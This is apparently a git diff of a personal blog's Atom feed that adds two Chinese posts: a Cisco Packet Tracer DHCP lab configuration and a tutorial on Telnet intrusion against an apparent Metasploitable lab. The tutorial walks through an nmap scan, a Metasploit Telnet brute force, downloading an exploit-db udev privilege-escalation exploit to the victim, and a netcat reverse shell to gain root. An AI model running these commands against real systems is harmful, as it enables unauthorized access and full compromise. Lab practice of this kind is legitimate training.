@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://grosad.github.io/"/>
-  <updated>2020-06-25T12:07:50.714Z</updated>
+  <updated>2020-06-25T17:05:01.474Z</updated>
   <id>http://grosad.github.io/</id>
   
   <author>
@@ -15,6 +15,63 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DHCP</title>
+    <link href="http://grosad.github.io/2020/06/25/dhcp/"/>
+    <id>http://grosad.github.io/2020/06/25/dhcp/</id>
+    <published>2020-06-25T15:30:05.000Z</published>
+    <updated>2020-06-25T17:05:01.474Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="网络搭建—DHCP"><a href="#网络搭建—DHCP" class="headerlink" title="网络搭建—DHCP"></a>网络搭建—DHCP</h1><blockquote><p>实验平台: Cisco Packet Tracer 7.3.0</p></blockquote><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/dhcp.png" alt></p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><h5 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h5><p>sw1</p><pre><code>enconfigint f0/1no swip add 172.16.1.254 255.255.255.0int f0/23no swip add 10.1.1.1 255.255.255.0service dhcpip dhcp exc 172.16.1.253 172.16.1.254ip dhcp exc 172.16.2.253 172.16.2.254ip dhcp pool net1network 172.16.1.0 255.255.255.0default-router 172.16.1.254dns-server 10.1.2.1exitip dhcp pool net2network 172.16.2.0 255.255.255.0default-router 172.16.2.254dns-server 10.1.2.1exitip route 172.16.2.0 255.255.255.0 10.1.1.2ip routing</code></pre><h5 id="DHCP中继"><a href="#DHCP中继" class="headerlink" title="DHCP中继"></a>DHCP中继</h5><p>sw2</p><pre><code>enconfigint f0/23no swip add 10.1.1.2 255.255.255.0int f0/1no swip add 172.16.2.254 255.255.255.0exitservice dhcpint f0/1ip helper 10.1.1.1exitip routingip route 172.16.1.0 255.255.255.0 10.1.1.1</code></pre><h5 id="DHCP监听"><a href="#DHCP监听" class="headerlink" title="DHCP监听"></a>DHCP监听</h5><p>sw3</p><pre><code>enconfigip dhcp snoopingint f0/1ip dhcp snooping trust</code></pre><p>sw4</p><pre><code>enconfigip dhcp snoopingint f0/1ip dhcp snooping trust</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;网络搭建—DHCP&quot;&gt;&lt;a href=&quot;#网络搭建—DHCP&quot; class=&quot;headerlink&quot; title=&quot;网络搭建—DHCP&quot;&gt;&lt;/a&gt;网络搭建—DHCP&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;实验平台: Cisco Packet Tracer 7.3
+      
+    
+    </summary>
+    
+    
+      <category term="网络搭建" scheme="http://grosad.github.io/categories/%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/"/>
+    
+    
+      <category term="收录" scheme="http://grosad.github.io/tags/%E6%94%B6%E5%BD%95/"/>
+    
+      <category term="网络搭建" scheme="http://grosad.github.io/tags/%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Telnet登录提权</title>
+    <link href="http://grosad.github.io/2020/06/25/Telnet-1/"/>
+    <id>http://grosad.github.io/2020/06/25/Telnet-1/</id>
+    <published>2020-06-25T15:01:33.000Z</published>
+    <updated>2020-06-25T17:04:25.518Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Telnet登录破解以及提取最高管理员root权限"><a href="#Telnet登录破解以及提取最高管理员root权限" class="headerlink" title="Telnet登录破解以及提取最高管理员root权限"></a>Telnet登录破解以及提取最高管理员root权限</h1><p>Telnet（Internet<a href="https://baike.baidu.com/item/远程登/2991166" target="_blank" rel="noopener">远程登</a>录服务的标准协议）默认开放于<strong>23端口</strong>。</p><p>注意：Telnet是<strong>明文传输</strong></p><h2 id="Telnet暴力破解"><a href="#Telnet暴力破解" class="headerlink" title="Telnet暴力破解"></a>Telnet暴力破解</h2><ol><li><h4 id="探测目标telnet服务是否开放"><a href="#探测目标telnet服务是否开放" class="headerlink" title="探测目标telnet服务是否开放"></a><strong>探测目标telnet服务是否开放</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23 -sV 192.168.0.103</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u1.png" alt></p><p>可以看到目标23端口处于Open状态，其开放的服务是Telnet服务</p></li><li><h4 id="使用Metasploitable进行暴力破解"><a href="#使用Metasploitable进行暴力破解" class="headerlink" title="使用Metasploitable进行暴力破解"></a>使用Metasploitable进行暴力破解</h4><p>在msf中使用<strong>telnet_login模块</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login</span><br><span class="line">&gt;set Rhost 目标IP</span><br><span class="line">&gt;set username 用户名</span><br><span class="line">&gt;set pass_file 密码字典</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure><blockquote><p>在msf中，username指定用户名，user_file指定用户名字典，密码同理</p></blockquote></li></ol><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u2.png" alt></p><p>成功破解，密码为msfadmin</p><p>这时可在msf中连接对应的telnet</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;sessions -l   查看可连接shell</span><br><span class="line">&gt;sessions -i id    连接指定的id</span><br></pre></td></tr></table></figure><p>可以看到成功连接，测试输入ifconfig有回显参数</p><h2 id="Telnet明文抓包"><a href="#Telnet明文抓包" class="headerlink" title="Telnet明文抓包"></a>Telnet明文抓包</h2><p>Telnet是<strong>明文传输</strong>，因此可以对此进行网络抓包，详细请见前篇《FTP服务漏洞利用》中的抓包流程</p><p>这里不再赘述</p><h4 id="这个时候有人要问了，登录了接下来干什么？"><a href="#这个时候有人要问了，登录了接下来干什么？" class="headerlink" title="这个时候有人要问了，登录了接下来干什么？"></a><strong>这个时候</strong>有人要问了，登录了接下来干什么？</h4><h3 id="提权啊！！！"><a href="#提权啊！！！" class="headerlink" title="提权啊！！！"></a>提权啊！！！</h3><h2 id="Telnet提取超级管理员（root）权限"><a href="#Telnet提取超级管理员（root）权限" class="headerlink" title="Telnet提取超级管理员（root）权限"></a>Telnet提取超级管理员（root）权限</h2><p>为方式写的过于繁杂看不懂，这里先做一个流程图</p><hr><ol><li>使用已经破解得到的用户名和密码登录telnet服务</li><li>msf中使用session -i 进行shell连接</li><li>渗透机准备提权文件</li><li>在已连接的shell里面   将渗透机的提权文件下载到受害机上</li><li>渗透机开启端口监听</li><li>在shell中执行，并定义反弹shell执行地址</li><li>连接shell，获得root权限</li></ol><hr><ol><li><h4 id="使用已经破解得到的用户名和密码登录telnet服务"><a href="#使用已经破解得到的用户名和密码登录telnet服务" class="headerlink" title="使用已经破解得到的用户名和密码登录telnet服务"></a>使用已经破解得到的用户名和密码登录telnet服务</h4></li><li><h4 id="msf中使用session-i-进行shell连接"><a href="#msf中使用session-i-进行shell连接" class="headerlink" title="msf中使用session -i 进行shell连接"></a>msf中使用session -i 进行shell连接</h4><p><strong><em>Kali中使用msf中的session连接shell，上述暴力破解已经描述，这里不再重复</em></strong></p><blockquote><p>为了不混淆Kali与shell内的操作，后续指令会加上前缀以区分</p></blockquote></li><li><h4 id="渗透机准备提权文件"><a href="#渗透机准备提权文件" class="headerlink" title="渗透机准备提权文件"></a><strong>渗透机准备提权文件</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@root &gt; service apache2 start   启动http服务</span><br><span class="line">kali@root &gt; cd &#x2F;var&#x2F;www&#x2F;html&#x2F;   </span><br><span class="line">kali@root &gt; wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572    下载提权文件</span><br></pre></td></tr></table></figure><p><strong>这里必须下载到var/www/html</strong></p><p><strong>因为受害机无法直接下载提权文件，所以需先将其下载到渗透机，并在渗透机开启http服务</strong></p><p><strong>然后从shell里把文件从渗透剂下载到受害机上，而默认传输目录就是var/www/html</strong></p><p><strong>这段有点长，但是一定要读懂</strong>！</p><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u4.png" alt></p><blockquote><p>这里把文件名改成test.c  因为原文件没有扩展名</p></blockquote></li><li><h4 id="在已连接的shell里面-将渗透机的提权文件下载到受害机上"><a href="#在已连接的shell里面-将渗透机的提权文件下载到受害机上" class="headerlink" title="在已连接的shell里面   将渗透机的提权文件下载到受害机上"></a>在已连接的shell里面   将渗透机的提权文件下载到受害机上</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell@msfadmin &gt; wget &quot;http:&#x2F;&#x2F;Kali的IP&#x2F;test.c&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u5.png" alt></p></li><li><h4 id="渗透机开启端口监听"><a href="#渗透机开启端口监听" class="headerlink" title="渗透机开启端口监听"></a>渗透机开启端口监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali@root &gt; nc -lvp 6666</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u6.png" alt></p><p><strong>这里Kali的端口6666开启持续监听</strong></p></li><li><h4 id="在shell中执行，并定义反弹shell执行地址"><a href="#在shell中执行，并定义反弹shell执行地址" class="headerlink" title="在shell中执行，并定义反弹shell执行地址"></a>在shell中执行，并定义反弹shell执行地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell@msfadmin &gt; gcc test.c -o exploit   编译C程序</span><br><span class="line">shell@msfadmin &gt; echo &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run  定义执行环境至&#x2F;run</span><br><span class="line">shell@msfadmin &gt; echo &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh KaliIP 监听端口&#39;  &gt;&gt; &#x2F;tmp&#x2F;run</span><br><span class="line">shell@msfadmin &gt; cat &#x2F;tmp&#x2F;run  验证run配置</span><br><span class="line">shell@msfadmin &gt; ps aux | grep udev  查看pid</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u7.png" alt></p><p>这里可以看到pid中已经出现了root权限，<strong>并且其id号为2793</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell@msfadmin &gt; .&#x2F;exploit root的id号-1</span><br></pre></td></tr></table></figure><p>例：pid中root的id号为2793  那么执行提权的id号是 2792 （即2793-1）</p></li><li><h4 id="连接shell，获得root权限"><a href="#连接shell，获得root权限" class="headerlink" title="连接shell，获得root权限"></a>连接shell，获得root权限</h4><p>提权开始</p><p><img src="https://cdn.jsdelivr.net/gh/Grosad/Grosad.github.io/images/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Grosad/p/image/u8.png" alt></p><p>这里返回刚才持续监听的6666端口</p><p>发现已经获取到了root权限</p><p>端口监听可能有点慢，需要多等待一会</p></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;Telnet登录破解以及提取最高管理员root权限&quot;&gt;&lt;a href=&quot;#Telnet登录破解以及提取最高管理员root权限&quot; class=&quot;headerlink&quot; title=&quot;Telnet登录破解以及提取最高管理员root权限&quot;&gt;&lt;/a&gt;Telnet登录破解以
+      
+    
+    </summary>
+    
+    
+      <category term="网络空间安全" scheme="http://grosad.github.io/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络空间安全" scheme="http://grosad.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="教程" scheme="http://grosad.github.io/tags/%E6%95%99%E7%A8%8B/"/>
+    
+  </entry>
   
   <entry>
     <title>《如果爱了》</title>
